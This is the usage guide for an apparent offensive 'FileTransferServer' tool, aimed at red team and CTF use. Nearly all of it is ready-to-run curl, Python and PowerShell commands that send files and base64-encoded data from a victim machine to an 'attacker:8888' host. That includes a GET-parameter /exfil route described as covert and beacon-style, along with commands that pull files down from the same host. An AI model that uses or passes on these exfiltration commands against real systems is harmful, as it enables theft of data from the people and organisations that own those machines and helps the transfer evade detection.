
# FileTransferServer Usage Examples (Victim Perspective)

These examples demonstrate how to use the `FileTransferServer` from a target or victim machine to exfiltrate data, upload files, or download files during a red team operation, CTF, or offensive security assessment.

---

## Uploading Files via POST (multipart/form-data)

### curl (Linux/macOS/WSL)
```bash
curl -X POST http://attacker:8888/<route> -F "file=@/path/to/loot.txt"
```

### curl.exe (Windows 10/11)
```cmd
curl.exe -X POST http://attacker:8888/<route> -F "file=@C:\Users\victim\loot.txt"
```

### Python One-liner
```bash
python3 -c "import requests; requests.post('http://attacker:8888/<route>', files={'file': open('loot.txt','rb')})"
```

---

## Uploading Base64-Encoded Data via POST (JSON)

### Python
```python
import requests, base64

data = base64.b64encode(open('loot.txt','rb').read()).decode()
json_payload = {"filename": "loot.txt", "data": data}

requests.post("http://attacker:8888/<route>", json=json_payload)
```

### PowerShell
```powershell
$bytes = Get-Content -Path "C:\path\to\loot.txt" -Encoding Byte
$b64 = [Convert]::ToBase64String($bytes)
$json = @{ filename = "loot.txt"; data = $b64 } | ConvertTo-Json -Compress

Invoke-RestMethod -Uri "http://attacker:8888/<route>" -Method POST -Body $json -ContentType "application/json"
```

---

## Uploading Base64-Encoded Data via GET (/exfil endpoint)

### Python
```python
import base64, requests

data = b"This is secret exfil"
b64 = base64.b64encode(data).decode()
requests.get(f"http://attacker:8888/exfil?q={b64}&filename=secret.txt")
```

### PowerShell
```powershell
$bytes = [System.Text.Encoding]::UTF8.GetBytes("this is sensitive")
$b64 = [Convert]::ToBase64String($bytes)
Invoke-WebRequest "http://attacker:8888/exfil?q=$b64&filename=payload.txt"
```

---

## Downloading Files via GET

### curl (Linux/macOS/WSL)
```bash
curl http://attacker:8888/<route> -o downloaded.zip
```

### PowerShell
```powershell
Invoke-WebRequest -Uri "http://attacker:8888/<route>" -OutFile "downloaded.zip"
```

### Python
```python
import requests

resp = requests.get("http://attacker:8888/<route>")
open("received.bin", "wb").write(resp.content)
```

---

## Notes
- Replace `<route>` with the actual generated route path returned or printed by the `FileTransferServer`.
- Base64 endpoints (`encoded=True`) are useful for sending payloads covertly or when multipart requests are blocked.
- The `/exfil` route enables passive beacon-style data transfers via URL parameters.
